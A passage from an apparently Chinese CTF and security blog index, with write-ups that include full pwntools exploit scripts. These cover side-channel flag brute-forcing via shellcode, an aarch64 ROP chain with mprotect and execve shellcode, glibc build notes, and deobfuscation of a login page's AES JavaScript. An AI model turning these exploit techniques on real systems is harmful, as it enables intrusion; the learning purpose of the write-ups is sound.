地址data_addr+0x100存储的flag内容p.send(asm(orw_shellcode))p.interactive()\n\n基于堆漏洞的orw可以看setcontext\n","categories":["stack"],"tags":["shellcode"]},{"title":"侧信道爆破","url":"/2024/05/07/%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4/","content":"侧信道攻击（Side-Channel Attack，SCA）是一种利用物理实现的信息泄露来获取敏感信息的攻击方式。这种攻击不直接攻击加密算法本身，而是通过分析系统的物理实现（如硬件设备）在执行加密操作时的某些可观测的物理量（如时间、功耗、电磁泄漏等）来获取信息。\n侧信道攻击的常见类型包括：\n时序攻击（Timing Attack）：通过测量计算或操作的时间来获取信息。例如，密码学操作中的加密或解密操作可能因为输入的不同而导致执行时间上的差异。功耗分析攻击（Power Analysis Attack）：通过分析设备的功耗变化来获取执行的操作信息，特别是在加密设备上。电磁泄漏攻击（Electromagnetic Emanation Attack）：通过捕捉设备发出的电磁辐射来获取信息。声学攻击（Acoustic Attack）：通过分析设备发出的声音来获取信息。错误注入攻击（Fault Injection Attack）：通过引入错误（如电压干扰、激光照射等）来破坏正常的执行流程，从而获取信息。\n在pwn题中一般使用侧信道爆破flag侧信道爆破适用于orw无w的情况，即程序只允许open和read。一般来说题目能够执行shellcode\n[蓝帽杯2021 slient]保护全开只允许open和read这个沙盒不知道为什么要sudo才能查到，顺便记录一下报错信息：输入啥就执行啥,mmap在0x1000开了一段可读可写可执行的内存空间这里通过比较缓冲区中flag的每一位，相同则进入循环。通过程序是否进入exit来判断flag该位正确与否shellcode:\ndef exp(dis,char):    p.recvuntil(b&quot;Welcome to silent execution-box.\\n&quot;)    shellcode = asm(&#x27;&#x27;&#x27;        mov r12,0x67616c66     ;al:rax 寄存器的低 8 位        push r12               ;cl:rcx 寄存器的低 8 位        mov rdi,rsp            ;dl:rdx 寄存器的低 8 位        xor esi,esi        xor edx,edx        mov al,2        syscall                 ;open(&#x27;./flag&#x27;)                            mov rdi,rax        mov rsi,0x10700        mov dl,0x40        xor rax,rax        syscall                 ;read(0,0x10700,0x40)                            mov dl, byte ptr [rsi+&#123;&#125;]  ; 将缓冲区中的某个字节加载到寄存器 dl        mov cl, &#123;&#125;             ; 将输入参数 char 加载到寄存器 cl        cmp cl, dl             ; 比较寄存器 cl 和 dl 的值        jz loop                ; 如果相等，跳转到 loop 标签        mov al, 60             ; 将系统调用号 60（exit）加载到寄存器 al         syscall                ; 执行系统调用 exit                            loop:                   ;循环        jmp loop        &#x27;&#x27;&#x27;.format(dis,char))    p.send(shellcode)\n\n我本地环境下的flag如下：\ntouch flag &amp;&amp; echo flag&#123;th1s_1S_a_T3st_f1ag&#125; &gt; flag\n完整exp\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;critical&#x27;,endian=&quot;little&quot;)def exp(index,char):    p.recvuntil(b&quot;Welcome to silent execution-box.\\n&quot;)    shellcode = asm(&#x27;&#x27;&#x27;        mov r12,0x67616c66        push r12        mov rdi,rsp        xor esi,esi        xor edx,edx        mov al,2        syscall                                             mov rdi,rax        mov rsi,0x10700        mov dl,0x40        xor rax,rax        syscall                                             mov dl, byte ptr [rsi+&#123;&#125;]          mov cl, &#123;&#125;                     cmp cl, dl                     jz loop                        mov al, 60                     syscall                                            loop:        jmp loop        &#x27;&#x27;&#x27;.format(index,char))    p.send(shellcode)flag = &quot;&quot;#possible_char = list(&quot;&#125;&#123;-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)#possible_char.append(&#x27;\\x00&#x27;)for i in range(len(flag),35):    sleep(1)    print(&quot;flag : &#123;&#125;&quot;.format(flag))    for j in range(0x20,0x80):        p = process(&#x27;./chall&#x27;)        try:            exp(i,j)            p.recvline(timeout=1)            flag += chr(j)            p.send(b&#x27;\\n&#x27;)            print(&quot;&#123;&#125; pos : &#123;&#125; success&quot;.format(i,chr(j)))            p.close()            break        except:                       p.close()\n\n没插电编译时间长，下午给我电打没了还没爆出来，晚上插上电几分钟就出了\n[xman2019 nooocall]保护全开沙盒ban掉了系统调用程序也是输入啥就执行啥，flag已经被读入到内存，但是只给了0x10的大小可以用同样的方式爆破（or已经执行了），但是长度限制，只能跳回shellcode自己身上\ndef exp (index,char):    shellcode = asm(&#x27;&#x27;&#x27;        mov rax,[rsp+0x10]        mov rax,[rax+0x18]        mov al,byte ptr[rax+&#123;&#125;]        cmp al,&#123;&#125;        jz $-0x2        &#x27;&#x27;&#x27;.format(index,char))    p.sendlineafter(b&#x27;Your Shellcode &gt;&gt;&#x27;, shellcode)\n完整exp\nfrom pwn import *import timecontext(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;critical&#x27;,endian=&quot;little&quot;)#possible_char = list(&quot;&#125;&#123;-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)#possible_char.append(&#x27;\\x00&#x27;)flag = &#x27;&#x27;i = 0def exp (index,char):    shellcode = asm(&#x27;&#x27;&#x27;        mov rax,[rsp+0x10]        mov rax,[rax+0x18]        mov al,byte ptr[rax+&#123;&#125;]        cmp al,&#123;&#125;        jz $-0x2        &#x27;&#x27;&#x27;.format(index,char))    p.sendlineafter(b&#x27;Your Shellcode &gt;&gt;&#x27;, shellcode)while 1:    print(&quot;flag : &#123;&#125;&quot;.format(flag))    length = len(flag)    for j in range(0x20,0x80):        p = process(&#x27;./xman_2019_nooocall&#x27;)        #p = remote(&#x27;node5.buuoj.cn&#x27;, 29290)                exp(i,j)        start = time.time()        p.can_recv_raw(timeout=3)        end = time.time()        p.close()        #爆不出正确flag需要调这里，可能是网络原因导致的        if end - start &gt; 3:            flag += chr(j)            print(&quot;&#123;&#125; pos : &#123;&#125; success&quot;.format(i,chr(j)))            i += 1            break\nbuu上远程的爆不穿，还得调，本地的倒是很快出来了）\n"},{"title":"指定glibc编译&&debug","url":"/2024/03/19/%E6%8C%87%E5%AE%9Aglibc%E7%BC%96%E8%AF%91-debug/","content":"之前一直都用海量的虚拟机解决编译等问题如图:)学到现在发现不是LTS版本的ubuntu维护起来极其麻烦\n以下实现一虚拟机下使用不同版本glibc\n首先先下载源码https://ftp.gnu.org/gnu/glibc/\n之后解压到目录下\ntar zxvf glibc-2.32.tar.gz\n&#x2F;&#x2F;以下：~&#x2F;Desktop&#x2F;glibc-2.32&#x2F;glibc-2.32 &#x3D; &#x2F;path&#x2F;to&#x2F;your&#x2F;libc\nmkdir buildcd build~/Desktop/glibc-2.32/glibc-2.32/configure --build=x86_64-pc-linux-gnu --prefix=$HOME/Desktop/glibc-2.32/buildmake -j8make install\n这里configure的时候可能会提示需要某些依赖或者软件，根据提示信息下载就行比如我这里提示缺少gawk那么就\nsudo apt install gawk\n\nmake时间较长，不报错就行\n这里有一点需要注意貌似make成功与否与gcc版本有关系，如下是我的尝试信息成功失败20.04可行 22.04不可行，猜测为低版本gcc能编译高版本glibc源码 待测试\n成功走完这里能用了gcc编译示例。\ngcc -Wl,-rpath,~/Desktop/glibc-2.32/glibc-2.32 kiwi.c -o k1w1 -static -z noexecstack -fstack-protector-all -pie -z now -masm=intel\n\n若要在gdb中启用，则需要进入gdb后手动指定，如下若使用pwntools脚本启动，则在启动时如下使用\nfrom pwn import *p = process([&quot;/home/str1k3/Desktop/glibc-2.32/elf/ld.so&quot;,&quot;./pwnfile&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;/home/str1k3/Desktop/glibc-2.32/libc.so.6&quot;&#125;)\n\n可以使用xclibc项目来切换运行libc环境，以下来自项目的README：这个脚本是基于最新版的glibc-all-in-one，我建议你将其安装到~目录\ngit clone https://github.com/matrix1001/glibc-all-in-onecd glibc-all-in-one./update_list\n\nxclibc脚本配置\ngit clone https://github.com/ef4tless/xclibc.gitcd xclibcsudo rm /usr/local/bin/xclibcsudo mv ./xclibc /usr/local/binsudo chmod +x /usr/local/bin/xclibc\n\n本地libc库部署(*可选)\nxclibc -d allxclibc -d old\n\n使用xclibc [选项] [参数]-s [libc文件] # 查看libc文件版本-x [-n] [文件] [libc文件] # 一键给文件配置libc文件相应版本的环境（添加-n选项可以使用修改--replace-needed的方式实现）-c [-n] [文件] [libc大版本号] [libc小版本环境路径] # 给文件配置指定的libc环境，输入大版本号后回车，可自由选择复制libc小版本环境路径（添加-n选项可以使用修改--replace-needed的方式实现）-d &lt;-r/-u&gt; [version]/[all]/[old]#  -d [ENTER] 可以查看所有可下载的libc版本#  -d -r [version] 删除相应的libc版本库#  -d -u 更新glibc-all-in-one libc版本列表(即清华源上有的libc版本列表)#  -d all 下载所有源上有的libc版本#  -d [version] 下载对应版本的libc-e [deb包] # 解压相应的libc_deb包至glibc_all_in_one路径，通常一个版本需要解压一份本体deb和一份debug_deb包-r [文件] # 恢复修改过的文件至初始状态-h # 展示帮助提示-v # 显示版本号\n好用爱用xclibc能下载到的东西比glibc-all-in-one多，大赞\n","categories":["plays"],"tags":["plays"]},{"title":"第一个aarch64_pwn","url":"/2024/04/08/%E7%AC%AC%E4%B8%80%E4%B8%AAarm-pwn/","content":"先存个异构程序的调试的环境搭建,这里以aarch64为例子\ngdb不支持异构，需要下载插件\nsudo apt-get install gdb-multiarchsudo apt-get install gcc-aarch64-linux-gnu\n这一步可能会有问题解决方法未知，我直接装了新的虚拟机）\n启动时使用\ngdb-multiarch\n然后设置一下架构此时注意，直接debug是不行的（异构怎么可能正常运行，但是静态编译的程序貌似能跑，但在gdb调试时显示的是x86的汇编，怪）在分别执行以下命令后（aarch64）\nset architecture aarch64file pwnfilerun\n遇到过一个bug(?)，在这里记录一下\nStarting program: /home/str1k3/Desktop/gadget_database /build/gdb-ZgDh0V/gdb-12.1/gdb/i387-tdep.c:597: internal-error: i387_supply_fxsave: Assertion `tdep-&gt;num_xmm_regs &gt; 0&#x27; failed.A problem internal to GDB has been detected,further debugging may prove unreliable.----- Backtrace -----0x5c992bd4a197 ???0x5c992c149464 ???0x5c992c1496a0 ???0x5c992c4adc64 ???0x5c992bea1b18 ???0x5c992bcce6c5 ???0x5c992bcc6800 ???0x5c992c0feea0 ???0x5c992c0037d9 ???0x5c992c003821 ???0x5c992c00752c ???0x5c992c005868 ???0x5c992bef0de5 ???0x5c992bef4d62 ???0x5c992c101ebf ???0x5c992bf64ea9 ???0x5c992be670fa ???0x5c992beaac8d ???0x5c992bef2a7c ???0x5c992beb145e ???0x5c992bd7f774 ???0x5c992c10fd94 ???0x5c992be4d6e4 ???0x5c992be4da83 ???0x5c992be4e206 ???0x7ca61124de0d ???0x5c992be4c7d5 ???0x5c992be4e0b4 ???0x5c992be4c3cb ???0x5c992c4ae395 ???0x5c992c4ae82a ???0x5c992bf1871c ???0x5c992bf1a404 ???0x5c992bc740ef ???0x7ca60fe29d8f __libc_start_call_main\t../sysdeps/nptl/libc_start_call_main.h:580x7ca60fe29e3f __libc_start_main_impl\t../csu/libc-start.c:3920x5c992bc79e24 ???0xffffffffffffffff ???---------------------This is a bug, please report it.  For instructions, see:&lt;https://www.gnu.org/software/gdb/bugs/&gt;.已中止 (核心已转储)\n\n可以使用qemu来模拟aarch64环境只调试的话可以只用user模式\nsudo apt-get install qemu-usersudo apt-get install qemu-user-binfmtsudo apt-get install &quot;binfmt*&quot;\n\n此时可以这样来调试-g指定端口，-L指定运行库\nqemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./pwnfile\n然后在另一个shell下\ngdb-multiarchset architecture aarch64target remote :1234\n即可开始调试\n如果要用脚本则\np = process([&quot;qemu-aarch64&quot;,&quot;-g&quot;,&quot;2345&quot;,&quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])\n也可以使用socat(相当于打远程了，反正一般靶机都是用qemu来模拟的)\n先跑起来\nsocat tcp-l:10002,fork exec:&quot;qemu-aarch64 -g 2345 -L /usr/aarch64-linux-gnu  ./gadget_database&quot;;reuseaddr\n在需要调试的脚本中\np = remote(&#x27;127.0.0.1&#x27;,10002)pause()\n趁pause的时候，启动gdb-multiarch\nset architecture aarch64target remote :2345\n就可以正常调试脚本，效果如下还是比较麻烦的\n有个问题就是qemu的gdbserver会占用端口，导致如果需要第二次调试则需要改端口\n环境搭好了，来点好玩的8\n[RITSEC CTF 2024]gadget_database*附件下载\n静态编译的aarch64程序这里有个问题，我使用IDApro7.7貌似是不能正确反编译的所以我们使用ghidra回答后有一个栈溢出\nfrom pwn import *context.log_level = &#x27;debug&#x27;p = remote(&quot;127.0.0.1&quot;,10003)pause()p.sendlineafter(&quot;enter password\\n&quot;,&quot;RS&#123;REALFLAG&#125;&quot;)payload = b&quot;a&quot;*44+p64(0xdeadbeef)p.sendline(payload)p.interactive()\n测得偏移为44可以用这三个gadget来控制寄存器，先通过read把shellcode写到bss里，再用mprotect给执行权限，最后跳到shellcode上执行。\n0x0000000000425ab4 : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x50 ; ret0x000000000041ddf8 : mov x1, x23 ; mov x5, x26 ; mov x3, x21 ; mov x0, x20 ; mov w7, #1 ; mov w6, #0 ; mov x4, #0 ; blr x190x0000000000406bd8 : mov x2, x22 ; blr x3\nshellcode asm不出来，我用树莓派asm的），顺便就存下来\nfrom pwn import *# from LibcSearcher import *context(arch = &#x27;aarch64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)#p=remote(&quot;ctf.ritsec.club&quot;,30865)p = remote(&quot;127.0.0.1&quot;,10002)elf = ELF(&#x27;./gadget_database&#x27;)def debug():    gdb.attach(p)    pause()mprotect = 0x4201C0p.sendlineafter(&quot;enter password\\n&quot;,&quot;RS&#123;REALFLAG&#125;&quot;)# debug()p.recvuntil(&quot;Enter a query\\n&quot;)# read(0,bss,0x100)bss = 0x49f000read = 0x41f388x19 = 0x0000000000406bd8x20 = 0x21 = readx22 = 0x100x23 = bssx24 = 0x415488x29 = 0x9x30 = 0x000000000041ddf8payload = b&quot;a&quot;*44+p64(0x0000000000425ab4)+p64(x29)+p64(x30)+p64(x19)+p64(x20)+p64(x21)+p64(x22)+p64(x23)+p64(x24)payload += p64(0xdeadbeef)*3#mprotect(0x0000000000406bd8,0x1000,0x7)bss = 0x49f000mprotect = 0x0000000004201C0x19 = 0x0000000000406bd8x20 = bssx21 = mprotectx22 = 7x23 = 0x1000x24 = 0x415488x29 = 0x9x30 = 0x000000000041ddf8payload += p64(0x0000000000425ab4)+p64(0)*4+p64(x29)+p64(x30)+p64(x19)+p64(x20)+p64(x21)+p64(x22)+p64(x23)+p64(x24)payload += b&quot;a&quot;*24 + p64(bss)p.sendline(payload)input()#shellcode = asm(shellcraft.sh())shellcode  = b&quot;\\xeeE\\x8c\\xd2.\\xcd\\xad\\xf2\\xee\\xe5\\xc5\\xf2\\xeee\\xee\\xf2\\x0f\\r\\x80\\xd2\\xee?\\xbf\\xa9\\xe0\\x03\\x00\\x91\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xa8\\x1b\\x80\\xd2\\x01\\x00\\x00\\xd4&quot;p.sendline(shellcode)p.interactive()","categories":["plays"],"tags":["plays"]},{"title":"记一个逆天的request","url":"/2025/04/29/%E8%AE%B0%E4%B8%80%E4%B8%AA%E9%80%86%E5%A4%A9%E7%9A%84request/","content":"login日常渗透ing…场景加载中…原始输入：username:admin123        password:admin123\nPOST /contingency/xxx/login HTTP/1.1Host: example.comConnection: keep-aliveContent-Length: 445sec-ch-ua-platform: &quot;Windows&quot;X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: application/json, text/javascript, */*; q=0.01sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;135&quot;, &quot;Not-A.Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;135&quot;Content-Type: application/x-www-form-urlencoded; charset=UTF-8sec-ch-ua-mobile: ?0Origin: https://example.comSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://example.com/contingency/xxx/indexAccept-Encoding: gzip, deflate, br, zstdAccept-Language: zh-CN,zh;q=0.9params=eyJhY2NvdW50IjoiVklXVFpiUkh2NjI4b3draUk5a0RMdz09IiwicGFzc3dvcmQiOiJWSVdUWmJSSHY2Mjhvd2tpSTlrREx3PT0iLCJrYXB0Y2hhIjoicHltYk85SXVOU0NaWUVFVDZaVjBEdz09IiwidXVpZCI6IjlGbzlpYkdKdlJxZXRCWXJ1WUVMbmkyNUNNakduc3N5aFRXT3dTVU1qSVFzRGpaNCtodWNVaWNMTmw2SmNMQysiLCJ2ZXJzaW9uIjoiYW5kcm9pZCIsInR5cGUiOjAsInZ0eXBlIjoiMSIsImVjYXRpZCI6IjBkQVhKV1N2eGJYM3V5aXpDQm1mSWc9PSIsImFjY3NtcyI6IjBkQVhKV1N2eGJYM3V5aXpDQm1mSWc9PSIsIlRpbWVzdGFtcCI6MTc0NTkxMDQ2NTEzNX0=\n看起来是jwt,搞一下(得先转一次url)？掐头去尾只留payload\n&#123;  &quot;account&quot; : &quot;VIWTZbRHv628owkiI9kDLw==&quot;,  &quot;password&quot; : &quot;VIWTZbRHv628owkiI9kDLw==&quot;,  &quot;kaptcha&quot; : &quot;pymbO9IuNSCZYEET6ZV0Dw==&quot;,  &quot;uuid&quot; : &quot;9Fo9ibGJvRqetBYruYELni25CMjGnssyhTWOwSUMjIQsDjZ4+hucUicLNl6JcLC+&quot;,  &quot;version&quot; : &quot;android&quot;,  &quot;type&quot; : 0,  &quot;vtype&quot; : &quot;1&quot;,  &quot;ecatid&quot; : &quot;0dAXJWSvxbX3uyizCBmfIg==&quot;,  &quot;accsms&quot; : &quot;0dAXJWSvxbX3uyizCBmfIg==&quot;,  &quot;Timestamp&quot; : 1745910465135&#125;\n这里的base看着不大对劲，解码发现应该是二进制数据，考虑AES加密后的结果。观察到js里有个AES_util,去看看\nvar CryptoJS=document[&quot;\\u0077\\u0072\\u0069\\u0074\\u0065&quot;](&quot;&gt;tpircs/&lt;&gt;&#x27;sj.sea/bil/sj/..&#x27;=crs tpircsavaj=egaugnal tpircs&lt;&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;));var base64=document[&quot;\\u0077\\u0072\\u0069\\u0074\\u0065&quot;](&quot;&gt;tpircs/&lt;&gt;&#x27;sj.46esab/bil/sj/..&#x27;=crs tpircsavaj=egaugnal tpircs&lt;&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;));(function(_0x2aea55,_0x2e748c)&#123;function _0x5d75a2(_0xfa7611,_0x826155,_0x142aa5,_0x2f38d2,_0x4f13a3)&#123;return _0x443f(_0x826155- -0x269,_0x2f38d2);&#125;function _0x20b738(_0x43a86a,_0x236ea2,_0x4277db,_0x58fcc9,_0x455dc8)&#123;return _0x443f(_0x455dc8- -0x188,_0x58fcc9);&#125;function _0x1e3d5b(_0x2f499a,_0xcf883d,_0x512890,_0x3bba1e,_0x740335)&#123;return _0x443f(_0x2f499a-0x14f,_0x3bba1e);&#125;var _0x2ad42e=_0x2aea55();function _0x3d720e(_0x12ddf5,_0x587ddd,_0x38da58,_0x2a12bd,_0x4eeffd)&#123;return _0x443f(_0x38da58-0x161,_0x2a12bd);&#125;function _0x2446fa(_0x5f3621,_0x1ae4e7,_0x38695c,_0x1cc263,_0x13bf6e)&#123;return _0x443f(_0x38695c-0x3cf,_0x1ae4e7);&#125;while(!![])&#123;try&#123;var _0x122ced=parseInt(_0x5d75a2(-0x268,-0x264,-0x26e,-0x267,-0x267))/0x1*(parseInt(_0x5d75a2(-0x24a,-0x24e,-0x248,-0x249,-0x24e))/0x2)+-parseInt(_0x3d720e(0x181,0x17f,0x177,0x17f,0x179))/0x3*(-parseInt(_0x5d75a2(-0x24b,-0x259,-0x260,-0x267,-0x250))/0x4)+-parseInt(_0x20b738(-0x176,-0x172,-0x16c,-0x178,-0x167))/0x5*(parseInt(_0x2446fa(0x3fa,0x3db,0x3eb,0x3e3,0x3f9))/0x6)+parseInt(_0x5d75a2(-0x25c,-0x265,-0x26a,-0x26a,-0x25f))/0x7+parseInt(_0x5d75a2(-0x24c,-0x252,-0x248,-0x260,-0x240))/0x8+parseInt(_0x20b738(-0x194,-0x17d,-0x188,-0x178,-0x188))/0x9*(parseInt(_0x1e3d5b(0x150,0x151,0x148,0x161,0x157))/0xa)+-parseInt(_0x5d75a2(-0x253,-0x25d,-0x25e,-0x264,-0x25b))/0xb;if(_0x122ced===_0x2e748c)&#123;break;&#125;else&#123;_0x2ad42e[&quot;\\u0070\\u0075\\u0073\\u0068&quot;](_0x2ad42e[&quot;\\u0073\\u0068\\u0069\\u0066\\u0074&quot;]());&#125;&#125;catch(_0x40a231)&#123;_0x2ad42e[&quot;\\u0070\\u0075\\u0073\\u0068&quot;](_0x2ad42e[&quot;\\u0073\\u0068\\u0069\\u0066\\u0074&quot;]());&#125;&#125;&#125;)(_0x5154,0x37ac5);var _0x5f=0x6+0x9;function _0x4d1802(_0x5ec7f3,_0x5d6a04,_0x4eea62,_0x3948d7,_0x3e3f76)&#123;return _0x443f(_0x3e3f76- -0x1f5,_0x3948d7);&#125;var aeskeyOriginal=_0x4d1802(-0x1cb,-0x1e3,-0x1dc,-0x1d6,-0x1dd);function _0x443f(_0x3c35be,_0x5154ce)&#123;var _0x443fce=_0x5154();_0x443f=function(_0x56e89c,_0x384a2)&#123;_0x56e89c=_0x56e89c-0x0;var _0x5089ac=_0x443fce[_0x56e89c];return _0x5089ac;&#125;;return _0x443f(_0x3c35be,_0x5154ce);&#125;function _0x5154()&#123;var _0x31fd54=[&quot;\\u0065\\u006e\\u0063&quot;,&quot;KINoJq9212251&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;VwGnXp112&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0070\\u0061\\u0072\\u0073\\u0065&quot;,&quot;kcolBtpyrced&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;gnirtsbus&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;htgnel&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;Pkcs7&#x27;,&quot;dap&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;bfkGlR4990788&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;lib&#x27;,&quot;dnetxe&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0055\\u0074\\u0066\\u0038&quot;,&quot;JZWyCW6922411&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0045\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u0072&quot;,&quot;\\u0041\\u0045\\u0053&quot;,&quot;cdph&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u0072&quot;,&#x27;ehpe&#x27;,&quot;\\u0033\\u0073\\u0056\\u0041\\u0042\\u0046\\u0062&quot;,&#x27;3260760oYubim&#x27;,&#x27;202306045YDZCWGZ&#x27;,&quot;rehpic_&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;FbKtv&#x27;,&quot;ClRYxq0501&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;4194meseVb&#x27;,&quot;gnirtSot&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;jrCCd&#x27;,&quot;\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074&quot;,&quot;\\u0042\\u006c\\u006f\\u0063\\u006b\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072\\u004d\\u006f\\u0064\\u0065&quot;,&quot;TnZGlN55&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;rorre&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0039\\u006d\\u0043\\u0047\\u004b\\u004d\\u0054&quot;,&#x27;207890VhBBQE&#x27;,&quot;\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0042\\u006c\\u006f\\u0063\\u006b&quot;];_0x5154=function()&#123;return _0x31fd54;&#125;;return _0x5154();&#125;_0x5f=0x9;var aeskey=function(_0x3f2016)&#123;var _0x4a103f;function _0x1920ce(_0x59e125,_0x554a7d,_0x5133f6,_0x110b7f,_0x54a95f)&#123;return _0x443f(_0x5133f6- -0x187,_0x59e125);&#125;var _0x435ae5=_0x3f2016[&quot;\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068&quot;];function _0x82f4cd(_0x2ae74f,_0x41daa4,_0x3ff6ff,_0x1f1b0e,_0x1249c1)&#123;return _0x443f(_0x41daa4-0x3ac,_0x1249c1);&#125;function _0x4116f3(_0x528f7a,_0x2f6820,_0x15364f,_0x1c9966,_0x57853b)&#123;return _0x443f(_0x15364f-0x2ab,_0x57853b);&#125;function _0x463cdc(_0x3344bd,_0x2a003b,_0x4862fa,_0x3797da,_0x22c871)&#123;return _0x443f(_0x3344bd-0x55,_0x4862fa);&#125;_0x4a103f=0x1;if(_0x435ae5&gt;(0xdb71e^0xdb70e))&#123;_0x3f2016=_0x3f2016[&#x27;substring&#x27;](0x1fc64^0x1fc64,0x53c69^0x53c79);&#125;if(_0x435ae5&lt;(0x2011b^0x2010b))&#123;if(_0x463cdc(0x73,0x63,0x68,0x63,0x65)===_0x463cdc(0x73,0x6a,0x7b,0x66,0x6b))&#123;var _0x4a8e78;var _0xc0aad7=(0x7097b^0x7096b)-_0x435ae5;_0x4a8e78=_0x1920ce(-0x177,-0x174,-0x172,-0x16b,-0x166);var _0x145175=[&#x27;G&#x27;,&quot;\\u005a&quot;,&#x27;Z&#x27;,&#x27;S&#x27;];for(var _0x21fe72=0x3dbf9^0x3dbf9;_0x21fe72&lt;_0xc0aad7;_0x21fe72++)&#123;console[&#x27;error&#x27;](_0x145175[_0x21fe72%(0xb4917^0xb4913)]);_0x3f2016=_0x3f2016+_0x145175[_0x21fe72%(0x904a3^0x904a7)];&#125;&#125;else&#123;var _0x1ed31f;var _0xa8c99e=(0x7097b^0x7096b)-_0xd66675;_0x1ed31f=_0x4116f3(0x2c3,0x2cd,0x2c0,0x2af,0x2b4);var _0x1aa99a=[&quot;\\u0047&quot;,&quot;\\u005a&quot;,&#x27;Z&#x27;,&#x27;S&#x27;];for(var _0x32f003=0x3dbf9^0x3dbf9;_0x32f003&lt;_0xa8c99e;_0x32f003++)&#123;_0x19b9fe[&quot;\\u0065\\u0072\\u0072\\u006f\\u0072&quot;](_0x1aa99a[_0x32f003%(0xb4917^0xb4913)]);_0x50f28f=_0x3d143f+_0x1aa99a[_0x32f003%(0x904a3^0x904a7)];&#125;&#125;&#125;return _0x3f2016;&#125;(aeskeyOriginal);function Encrypt(_0xd38f18)&#123;var _0x24f3da=CryptoJS[&#x27;enc&#x27;][&#x27;Utf8&#x27;][&#x27;parse&#x27;](aeskey);var _0x496e2a=0x0+0x5;var _0x1d81ab=CryptoJS[&quot;\\u0065\\u006e\\u0063&quot;][&quot;\\u0055\\u0074\\u0066\\u0038&quot;][&#x27;parse&#x27;](_0xd38f18);_0x496e2a=0x2;var _0x4e1e84=CryptoJS[&#x27;AES&#x27;][&#x27;encrypt&#x27;](_0x1d81ab,_0x24f3da,&#123;&#x27;mode&#x27;:getEcb(),&#x27;padding&#x27;:CryptoJS[&quot;\\u0070\\u0061\\u0064&quot;][&quot;\\u0050\\u006b\\u0063\\u0073\\u0037&quot;]&#125;);return _0x4e1e84[&#x27;toString&#x27;]();&#125;function getEcb()&#123;var _0x359456;var _0xd82ce2=CryptoJS[&quot;\\u006c\\u0069\\u0062&quot;][&quot;\\u0042\\u006c\\u006f\\u0063\\u006b\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072\\u004d\\u006f\\u0064\\u0065&quot;][&quot;\\u0065\\u0078\\u0074\\u0065\\u006e\\u0064&quot;]();_0x359456=_0x248003(-0x290,-0x297,-0x28b,-0x29b,-0x28e);_0xd82ce2[&#x27;Encryptor&#x27;]=_0xd82ce2[&#x27;extend&#x27;](&#123;&quot;\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0042\\u006c\\u006f\\u0063\\u006b&quot;:function(_0x1ee2c8,_0x5518cc)&#123;this[&quot;\\u005f\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072&quot;][&quot;\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0042\\u006c\\u006f\\u0063\\u006b&quot;](_0x1ee2c8,_0x5518cc);&#125;&#125;);_0xd82ce2[&quot;\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u0072&quot;]=_0xd82ce2[&#x27;extend&#x27;](&#123;&#x27;processBlock&#x27;:function(_0x4e4888,_0x164758)&#123;function _0x22d224(_0x2fcea5,_0xc2e735,_0xe53dfd,_0x50985f,_0x500d93)&#123;return _0x443f(_0xe53dfd-0x1e9,_0xc2e735);&#125;function _0x4e16ee(_0x5dc972,_0x16f7c4,_0x7996d1,_0x4ee193,_0x3accff)&#123;return _0x443f(_0x16f7c4-0x27,_0x4ee193);&#125;if(_0x22d224(0x200,0x20f,0x203,0x206,0x1fc)!==_0x4e16ee(0x30,0x41,0x3d,0x3d,0x36))&#123;var _0x3d5956=_0x318c97[&quot;\\u0065\\u006e\\u0063&quot;][&#x27;Utf8&#x27;][&quot;\\u0070\\u0061\\u0072\\u0073\\u0065&quot;](_0x434618);var _0x1f437c=0x0+0x5;var 